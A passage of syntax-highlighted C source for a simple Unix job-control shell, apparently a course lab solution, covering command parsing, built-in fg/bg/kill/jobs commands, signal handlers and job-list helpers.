sigchld_handler);  <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell's read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">	<span class="comment">/* Read command line */</span></span><br><span class="line">	<span class="keyword">if</span> (emit_prompt) {</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"%s"</span>, prompt);</span><br><span class="line">	    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">	    app_error(<span class="string">"fgets error"</span>);</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) { <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">	    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Evaluate the command line */</span></span><br><span class="line">	eval(cmdline);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    } </span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">}</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don't receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span><br><span class="line">{</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="type">char</span>* argv[MAXARGS];  <span class="comment">// Argument list for execve()</span></span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];    <span class="comment">// Holds modified command line</span></span><br><span class="line">    <span class="type">int</span> bg;               <span class="comment">// Run in bg or fg</span></span><br><span class="line">    <span class="type">pid_t</span> pid;            <span class="comment">// Process id</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;           <span class="comment">// Ignore empty lines</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">sigset_t</span> mask_all, mask, prev;</span><br><span class="line">    sigfillset (&amp;mask_all);</span><br><span class="line">    sigemptyset (&amp;mask);</span><br><span class="line">    sigaddset (&amp;mask, SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) {</span><br><span class="line">        sigprocmask (SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) {</span><br><span class="line">            sigprocmask (SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">            setpgid (<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s: Command not found.\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        sigprocmask (SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="type">int</span> state = bg ? BG : FG;</span><br><span class="line">        addjob (jobs, pid, state, cmdline);</span><br><span class="line">        sigprocmask (SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Parent waits for fg job to terminate</span></span><br><span class="line">        <span class="keyword">if</span> (!bg) {</span><br><span class="line">            waitfg (pid);</span><br><span class="line">        } </span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            list_cont_bgjob(getjobpid(jobs, pid));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="type">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="type">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="type">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">' '</span>;  <span class="comment">/* replace trailing '\n' with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">	buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">	buf++;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) {</span><br><span class="line">	argv[argc++] = buf;</span><br><span class="line">	*delim = <span class="string">'\0'</span>;</span><br><span class="line">	buf = delim + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">	       buf++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">	    buf++;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span> {</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">'&amp;'</span>)) != <span class="number">0</span>) {</span><br><span class="line">	argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>)) {</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) {</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"kill"</span>)) {</span><br><span class="line">        do_kill(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) {</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"&amp;"</span>)) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_kill</span><span class="params">(<span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>) {</span><br><span class="line">        <span class="type">int</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">        pid = jid2pid(jid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    kill (-pid, SIGKILL);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"fg command requires PID or %%jobid argument\n"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"bg command requires PID or %%jobid argument\n"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>) {</span><br><span class="line">        <span class="type">int</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (jid == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"fg: argument must be a PID or %%jobid\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span>{</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"bg: argument must be a PID or %%jobid\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        pid = jid2pid(jid);</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, jid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"fg: argument must be a PID or %%jobid\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span>{</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"bg: argument must be a PID or %%jobid\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    kill (-pid, SIGCONT);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">job</span> =</span> getjobpid (jobs, pid);</span><br><span class="line">    <span class="keyword">if</span> (job == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, pid);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) {</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        list_cont_bgjob (job);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset (&amp;mask);</span><br><span class="line"></span><br><span class="line">    fg_pid = pid; </span><br><span class="line">    fg_state = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span> (!fg_state) {</span><br><span class="line">        <span class="comment">//sleep(1);</span></span><br><span class="line">        sigsuspend (&amp;mask);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************</span></span><br><span class="line"><span class="comment"> * Signal handlers</span></span><br><span class="line"><span class="comment"> *****************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn't wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">{</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="type">int</span> old_errno = errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    sigfillset (&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid (<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) {</span><br><span class="line">        sigprocmask (SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">        <span class="keyword">if</span> (pid == fg_pid) {</span><br><span class="line">            fg_state = pid;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Child process is stopped</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSTOPPED(status)) {</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">job</span> =</span> getjobpid (jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, job-&gt;jid, pid, WSTOPSIG(status));</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Child process is terminated</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) {</span><br><span class="line">            <span class="keyword">struct</span> <span class="type">job_t</span>* job = getjobpid (jobs, pid);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, job-&gt;jid, pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Child process exits normally</span></span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        }</span><br><span class="line">        sigprocmask (SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    errno = old_errno;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> old_errno = errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line"></span><br><span class="line">    sigfillset (&amp;mask_all);</span><br><span class="line">    sigprocmask (SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">    <span class="keyword">if</span> (!fg_state) {</span><br><span class="line">        kill (-fg_pid, SIGINT);</span><br><span class="line">        list_terminated_fgjob (getjobpid(jobs, fg_pid));</span><br><span class="line">        deletejob (jobs, fg_pid);</span><br><span class="line">        fg_state = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    sigprocmask (SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    errno = old_errno;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> old_errno = errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, prev;</span><br><span class="line">    sigfillset (&amp;mask_all);</span><br><span class="line">    sigprocmask (SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">    <span class="keyword">if</span> (!fg_state) {</span><br><span class="line">        kill (-fg_pid, SIGTSTP);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">job</span> =</span> getjobpid (jobs, fg_pid);</span><br><span class="line">        job-&gt;state = ST;</span><br><span class="line">        list_stopped_fgjob (job);</span><br><span class="line">        fg_state = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    sigprocmask (SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    errno = old_errno;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************</span></span><br><span class="line"><span class="comment"> * End signal handlers</span></span><br><span class="line"><span class="comment"> *********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************</span></span><br><span class="line"><span class="comment"> * Helper routines that manipulate the job list</span></span><br><span class="line"><span class="comment"> **********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clearjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *job)</span> {</span><br><span class="line">    job-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;jid = <span class="number">0</span>;</span><br><span class="line">    job-&gt;state = UNDEF;</span><br><span class="line">    job-&gt;cmdline[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* initjobs - Initialize the job list */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span> {</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	clearjob(&amp;jobs[i]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maxjid - Returns largest allocated job ID */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">maxjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, max=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].jid &gt; max)</span><br><span class="line">	    max = jobs[i].jid;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* addjob - Add a job to the job list */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid, <span class="type">int</span> state, <span class="type">char</span> *cmdline)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) {</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid == <span class="number">0</span>) {</span><br><span class="line">	    jobs[i].pid = pid;</span><br><span class="line">	    jobs[i].state = state;</span><br><span class="line">	    jobs[i].jid = nextjid++;</span><br><span class="line">	    <span class="keyword">if</span> (nextjid &gt; MAXJOBS)</span><br><span class="line">		nextjid = <span class="number">1</span>;</span><br><span class="line">	    <span class="built_in">strcpy</span>(jobs[i].cmdline, cmdline);</span><br><span class="line">  	    <span class="keyword">if</span>(verbose){</span><br><span class="line">	        <span class="built_in">printf</span>(<span class="string">"Added job [%d] %d %s\n"</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Tried to create too many jobs\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* deletejob - Delete a job whose PID=pid from the job list */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deletejob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) {</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid == pid) {</span><br><span class="line">	    clearjob(&amp;jobs[i]);</span><br><span class="line">	    nextjid = maxjid(jobs)+<span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fgpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span> {</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].state == FG)</span><br><span class="line">	    <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobpid  - Find a job (by PID) on the job list */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="type">job_t</span> *<span class="title function_">getjobpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span> {</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid == pid)</span><br><span class="line">	    <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* getjobjid  - Find a job (by JID) on the job list */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="type">job_t</span> *<span class="title function_">getjobjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">int</span> jid)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].jid == jid)</span><br><span class="line">	    <span class="keyword">return</span> &amp;jobs[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pid2jid - Map process ID to job ID */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pid2jid</span><span class="params">(<span class="type">pid_t</span> pid)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid == pid) {</span><br><span class="line">            <span class="keyword">return</span> 